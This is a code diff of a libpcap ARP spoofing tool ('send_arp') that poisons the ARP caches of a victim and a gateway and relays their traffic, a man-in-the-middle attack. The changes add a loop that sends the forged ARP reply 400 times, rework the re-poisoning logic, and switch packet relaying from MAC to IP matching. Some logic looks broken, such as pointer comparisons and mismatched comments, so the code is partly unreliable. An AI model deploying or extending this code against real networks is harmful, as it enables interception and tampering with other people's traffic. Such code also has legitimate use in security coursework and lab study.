@@ -36,7 +36,7 @@ void sendPacket(ARPPacket *arpReply, int packeLen, pcap_t *pcd);
 void getMyIP(char* device, u_int8_t* myIP);
 int  findARPReply(char* device, char* rule, u_int8_t *retnMAC);
 int antiRecover(char *device, pcap_t *pcd, char *errBuf, ARPPacket *ARPRecover, u_int8_t *senderMAC, u_int8_t *targetMAC, u_int8_t *senderIP, u_int8_t *targetIP);
-void relay(char *device, pcap_t *pcd, char *errBuf, u_int8_t *senderMAC, u_int8_t *targetMAC);
+void relay(char *device, pcap_t *pcd, char *errBuf, u_int8_t *senderIP, u_int8_t *targetIP);
 
 /*send_arp <dev> <sender ip> <target ip>*/
 
@@ -66,7 +66,7 @@ int main(int argc, char *argv[])
 
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *pcd;
-    if((pcd = pcap_open_live(device,BUFSIZ,PROMISCUOUS,1,errbuf))==NULL)//promiscuous
+    if((pcd = pcap_open_live(device,BUFSIZ,NONPROMISCUOUS,1,errbuf))==NULL)
     {
         perror(errbuf);
         exit(1);
@@ -146,8 +146,12 @@ int main(int argc, char *argv[])
 
 
     sendPacket(&ARPToTargetReply,sizeof(struct ARPPacket),pcd);//send to gateway request
-
-
+int count=0;
+    while(count++<400)
+    {
+        sendPacket(&ARPToTargetReply,sizeof(struct ARPPacket),pcd);//send to gateway request
+        sleep(1);
+    }
     struct ARPPacket ARPRecover;
     int recoverCount=0;
 
@@ -453,11 +457,6 @@ int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_in
                     sha=ARPRecover->arp.arp_sha;
                     spa=ARPRecover->arp.arp_spa;
 
-                    /*
-                     * Mac tha;
-                    Ip tpa;
-                    tha=ARPRecover->arp.arp_tha;
-                    tpa=ARPRecover->arp.arp_tpa;*/
                     if(sha==senderMAC)
                         if(spa==senderIP) //recover about senderIP
                             return 1;
@@ -467,9 +466,7 @@ int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_in
 
                     if(sha==targetMAC)
                         if(spa==targetIP) //recover about targetIP
-                            return 2;
-
-
+                            return 1;
 
                 }
 
@@ -491,7 +488,7 @@ int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_in
 
 }
 
-void relay(char* device, pcap_t* pcd,char* errBuf, u_int8_t* senderMAC,u_int8_t* targetMAC)
+void relay(char* device, pcap_t* pcd,char* errBuf, u_int8_t* senderIP,u_int8_t* targetIP)
 {
     bpf_u_int32 netp,maskp;
 
@@ -504,7 +501,7 @@ void relay(char* device, pcap_t* pcd,char* errBuf, u_int8_t* senderMAC,u_int8_t*
     struct pcap_pkthdr *pkthdr;
     const u_int8_t* pktdata;
     int valueOfNextEx=0;
-    struct ARPPacket* packet;
+
     while(true)
     {
 
@@ -514,19 +511,18 @@ void relay(char* device, pcap_t* pcd,char* errBuf, u_int8_t* senderMAC,u_int8_t*
         switch (valueOfNextEx)
         {
             case 1:
-            //need to avoid arp packet
-                 packet=(struct ARPPacket *)pktdata;
+            {
+             IpPacket ippacket(pktdata);
+                if(ippacket.isIpPacket)//if packet is packet &
+                    if(ippacket.saddr==targetIP)//if destination ip address == target IP
+                        pcap_sendpacket(pcd,pktdata,pkthdr->len);
 
-                 //gateway -> senderPC
-                 if(memcmp(packet->eh.ether_dhost,senderMAC,ETHER_ADDR_LEN)==0)
-                     if(memcmp(packet->eh.ether_shost,targetMAC,ETHER_ADDR_LEN)==0)
-                            pcap_sendpacket(pcd,pktdata,pkthdr->len);
+                if(ippacket.isIpPacket)//if packet is packet &
+                    if(ippacket.daddr==senderIP)//if destination ip address == target IP
+                        pcap_sendpacket(pcd,pktdata,pkthdr->len);
 
-
-                 if(memcmp(packet->eh.ether_dhost,targetMAC,ETHER_ADDR_LEN)==0)
-                     if(memcmp(packet->eh.ether_shost,senderMAC,ETHER_ADDR_LEN)==0)
-                            pcap_sendpacket(pcd,pktdata,pkthdr->len);
-                 break;
+                break;
+            }
             case 0:
                 cout<<"need a sec.. to packet capture"<<endl;
                 continue;
